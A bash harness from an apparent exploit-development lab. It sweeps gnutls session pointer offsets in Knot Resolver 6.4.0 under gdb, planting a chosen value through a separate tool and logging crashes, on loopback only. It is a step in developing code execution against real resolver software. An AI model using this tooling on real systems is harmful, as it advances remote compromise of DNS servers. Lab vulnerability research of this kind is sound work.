#!/bin/bash
# Loopback-only: for each candidate gnutls-session pointer offset, place a
# chosen 0x4141414141414141 there with F6, close the connection and record
# whether any dereference stops the inferior.  Usage: run_gnutls_sweep.sh
set +e
BASE=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell
KRESD="$BASE/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd"
OUT="$BASE/harness/gnutls-sweep.txt"
: > "$OUT"
for OFF in 0x10 0x18 0xd8 0xf8 0x100 0x110 0x178; do
  LOG="$BASE/harness/gnutls-sweep-$OFF.log"
  pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
  pkill -9 -f 'crash-watch.gdb' 2>/dev/null
  sleep 1
  gdb -q -batch -x "$BASE/harness/crash-watch.gdb" "$KRESD" > "$LOG" 2>&1 &
  GB=$!
  sleep 6
  "$BASE/poc/venv/bin/python" "$BASE/harness/ksl_stalled.py" 8855 1 "$OFF" \
    >> "$OUT" 2>&1
  sleep 7
  echo "=== offset $OFF ===" >> "$OUT"
  if grep -q 'STOP: rip=' "$LOG"; then
    grep -A4 'STOP: rip=' "$LOG" >> "$OUT"
  else
    echo 'no stop (kresd alive)' >> "$OUT"
  fi
  kill -9 $GB 2>/dev/null
  pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
  sleep 1
done
echo "=== summary ===" >> "$OUT"
grep -E '=== offset|STOP: rip|no stop' "$OUT"
echo "=== END ==="
